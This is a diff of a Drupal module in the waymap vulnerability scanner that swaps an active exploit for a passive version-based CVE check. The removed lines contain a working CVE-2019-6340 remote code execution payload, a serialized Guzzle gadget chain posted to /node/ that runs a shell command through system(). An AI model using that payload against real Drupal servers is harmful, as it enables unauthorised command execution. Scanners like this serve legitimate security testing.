@@ -1,73 +1,96 @@
 # Copyright (c) 2024 waymap developers
 # See the file 'LICENSE' for copying permission.
-# drupal.py profile high
-
-from colorama import Fore, Style, init
-init(autoreset=True)
+# dp.py high-risk
 
 import requests
-import re
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+from packaging.version import parse as parse_version
+from colorama import Fore, Style
+from datetime import datetime
+from lib.ProfileCritical.drupal_version import fetch_drupal_version
+from lib.core.settings import CVE_DB_URL
+from data.cveinfo import CVE_DATABASE_DRUPAL
 
-class Color:
-    IMPORTANT = '\33[35m'
-    NOTICE = '\033[33m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    RED = '\033[91m'
-    END = '\033[0m'
+def determine_severity(cvss_score):
+    """Determine severity based on CVSS v3.x score."""
+    if cvss_score == 0.0:
+        return "None"
+    elif 0.1 <= cvss_score <= 3.9:
+        return "Low"
+    elif 4.0 <= cvss_score <= 6.9:
+        return "Medium"
+    elif 7.0 <= cvss_score <= 8.9:
+        return "High"
+    elif 9.0 <= cvss_score <= 10.0:
+        return "Critical"
+    return "Unknown"
 
-color_random = [Color.IMPORTANT, Color.NOTICE, Color.OKGREEN, Color.WARNING, Color.RED, Color.END]
+def fetch_cve_details(cve_id):
+    """Fetch CVE details from CVE database."""
+    url = CVE_DB_URL.format(cve_id=cve_id)
+    response = requests.get(url)
+    return response.json() if response.status_code == 200 else {}
 
+def is_vulnerable(version, cve_info):
+    """Generic function to check if the version is vulnerable based on CVE info."""
+    if version:
+        parsed_version = parse_version(version)
+        vulnerable_versions = cve_info["vulnerable_version"].split(",")
+        
+        for v_range in vulnerable_versions:
+            v_range = v_range.strip()
+            if '-' in v_range: 
+                start, end = v_range.split('-')
+                if parse_version(start) <= parsed_version <= parse_version(end):
+                    return True
+            elif parse_version(v_range) == parsed_version:
+                return True
+    return False
 
-def scan_cve_2019_6340(profile_url):
-    url_dir = "/node/"
-    vuln_url = profile_url + url_dir
-
-    print(color_random[2] + "\n[+] Vuln URL: %s\n" % vuln_url + Color.END)
-
-    querystring = {"_format": "hal_json"}
-    cmd = "id"  
-    cmd_length = len(cmd)
-    
-    payload = "{\r\n  \"link\": [\r\n    {\r\n      \"value\": \"link\",\r\n      \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\r\n    }\r\n  ],\r\n  \"_links\": {\r\n    \"type\": {\r\n      \"href\": \"http://localhost/rest/type/shortcut/default\"\r\n    }\r\n  }\r\n}" % (cmd_length, cmd)
-
-    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
-    headers = {
-        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
-        'Connection': "close",
-        'Content-Type': "application/hal+json",
-        'Accept': "*/*",
-        'Cache-Control': "no-cache"
-    }
-
+def scan_cve(target_url, cve_id, cve_info):
+    """Generic CVE scan function with exception handling for KeyboardInterrupt."""
     try:
-        response = requests.post(vuln_url, data=payload, headers=headers, proxies=proxies, params=querystring, verify=False)
+        current_time = datetime.now().strftime("%H:%M:%S") 
+        print(f"[{Fore.BLUE}{current_time}{Style.RESET_ALL}]::{Fore.GREEN}[Checking]{Style.RESET_ALL}~ {cve_id}")
 
-        if response.status_code == 403 and "u0027access" in response.text:
-            print(color_random[1] + "\n[!] Access forbidden. CVE-2019-6340 vulnerability detected but access is restricted.\n" + Color.END)
-            m = re.findall('.*permissions."}(.*)', response.text, re.S)
-            if m:
-                print(color_random[3] + m[0] + Color.END)
-        elif response.status_code == 200:
-            print(color_random[2] + "\n[+] Success! Server is vulnerable to CVE-2019-6340. Command executed.\n" + Color.END)        
-            print(color_random[3] + response.text + Color.END)
-            return True
+        print(f"{Style.BRIGHT}{Fore.WHITE}[Testing Target: {target_url}]{Style.RESET_ALL}")
+
+        version = fetch_drupal_version(target_url)
+        if version:
+            print(f"{Style.BRIGHT}{Fore.CYAN}[i] Detected Drupal version: {version}{Style.RESET_ALL}")
+            if is_vulnerable(version, cve_info):
+                print(f"{Style.BRIGHT}{Fore.GREEN}[!] Target is vulnerable to {cve_id} ({version}){Style.RESET_ALL}")
+                cve_details = fetch_cve_details(cve_id)
+                if cve_details:
+                    print(f"{Style.BRIGHT}{Fore.CYAN}Summary: {cve_details.get('summary', 'N/A')}{Style.RESET_ALL}")
+                    print(f"{Style.BRIGHT}{Fore.CYAN}CVSS Score: {cve_details.get('cvss_score', 'N/A')}{Style.RESET_ALL}")
+                    print(f"{Style.BRIGHT}{Fore.CYAN}Severity: {determine_severity(cve_details.get('cvss_score', 0))}{Style.RESET_ALL}")
+                print(f"{Style.BRIGHT}{Fore.YELLOW}[!] Recommendation: Update Drupal to a secure version to mitigate {cve_id}.{Style.RESET_ALL}")
+            else:
+                print(f"{Style.BRIGHT}{Fore.RED}[+] Target is not vulnerable to {cve_id} ({version}).{Style.RESET_ALL}")
         else:
-            print(color_random[4] + "\n[!] No vulnerability detected. Status Code: %d\n" % response.status_code + Color.END)
-            return False
-    
-    except requests.RequestException as e:
-        print(color_random[4] + "\n[!] An error occurred while sending the request.\n" + Color.END)
-        print(color_random[3] + "Error details: %s" % str(e) + Color.END)
-        return
-
-def handle_cve_2019_6340(profile_url):
-    try:
-        print("\n")
-        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2019-6340 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
-        scan_cve_2019_6340(profile_url)
-        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2019-6340 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
+            print(f"{Style.BRIGHT}{Fore.YELLOW}[!] Could not detect Drupal version. Skipping vulnerability checks.{Style.RESET_ALL}")
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2019-6340 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
-        return
+        handle_user_interrupt()
+
+def handle_user_interrupt():
+    """Handle user interruption (Ctrl+C) gracefully."""
+    print("\n[!] Scan interrupted by user. Options:")
+    while True:
+        user_input = input(f"{Style.BRIGHT}{Fore.CYAN}Enter 'n' for next target, 'e' to exit, or press Enter to resume: {Style.RESET_ALL}")
+        if user_input.lower() == 'n':
+            print(f"{Style.BRIGHT}{Fore.GREEN}Skipping to next target...{Style.RESET_ALL}")
+            break
+        elif user_input.lower() == 'e':
+            print(f"{Style.BRIGHT}{Fore.RED}Exiting...{Style.RESET_ALL}")
+            exit(0)
+        elif user_input == '':
+            print(f"{Style.BRIGHT}{Fore.GREEN}Resuming scan...{Style.RESET_ALL}")
+            break
+        else:
+            print(f"{Style.BRIGHT}{Fore.YELLOW}Invalid input. Please try again.{Style.RESET_ALL}")
+            continue
+
+def scan_all_cves_for_target(target_url):
+    """Scan a target URL against all known CVEs for Drupal."""
+    for cve_info in CVE_DATABASE_DRUPAL:
+        scan_cve(target_url, cve_info['cve_id'], cve_info)
